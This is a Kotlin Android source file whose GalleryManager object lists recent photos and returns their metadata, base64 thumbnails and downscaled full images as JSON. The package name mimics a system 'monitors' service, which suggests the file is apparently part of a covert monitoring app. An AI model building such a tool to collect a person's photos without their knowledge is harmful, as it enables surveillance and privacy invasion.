package com.system.service.monitors

import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.provider.MediaStore
import android.util.Base64
import android.util.Size
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream

object GalleryManager {

    fun getRecentPhotos(context: Context, limit: Int = 20): JSONArray {
        val result = JSONArray()
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.SIZE
        )
        val cursor = context.contentResolver.query(
            uri, projection, null, null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        ) ?: return result

        cursor.use {
            val colId   = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val colName = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val colDate = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
            val colSize = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
            var count = 0
            while (it.moveToNext() && count < limit) {
                val id = it.getLong(colId)
                val contentUri = ContentUris.withAppendedId(uri, id)
                val obj = JSONObject().apply {
                    put("id",   id)
                    put("name", it.getString(colName) ?: "")
                    put("date", it.getLong(colDate) * 1000L)
                    put("size", it.getLong(colSize))
                    // Use content URI as path (works on all Android versions)
                    put("path", contentUri.toString())
                }
                // Thumbnail — use loadThumbnail on API 29+, BitmapFactory on older
                try {
                    val bmp: Bitmap? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        context.contentResolver.loadThumbnail(contentUri, Size(200, 200), null)
                    } else {
                        @Suppress("DEPRECATION")
                        MediaStore.Images.Thumbnails.getThumbnail(
                            context.contentResolver, id,
                            MediaStore.Images.Thumbnails.MINI_KIND, null)
                    }
                    if (bmp != null) {
                        val baos = ByteArrayOutputStream()
                        bmp.compress(Bitmap.CompressFormat.JPEG, 55, baos)
                        bmp.recycle()
                        obj.put("thumb", Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
                    }
                } catch (_: Exception) {}
                result.put(obj)
                count++
            }
        }
        return result
    }

    fun getFullPhoto(context: Context, path: String): String? {
        return try {
            // path is a content:// URI string
            val uri = android.net.Uri.parse(path)
            val stream = context.contentResolver.openInputStream(uri) ?: return null
            val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            val tempBytes = stream.readBytes()
            BitmapFactory.decodeByteArray(tempBytes, 0, tempBytes.size, opts)
            val maxDim = maxOf(opts.outWidth, opts.outHeight)
            val scale = if (maxDim > 1080) maxDim / 1080 else 1
            val decodeOpts = BitmapFactory.Options().apply { inSampleSize = scale }
            val bmp = BitmapFactory.decodeByteArray(tempBytes, 0, tempBytes.size, decodeOpts)
                ?: return null
            val baos = ByteArrayOutputStream()
            bmp.compress(Bitmap.CompressFormat.JPEG, 75, baos)
            bmp.recycle()
            Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
        } catch (_: Exception) { null }
    }
}
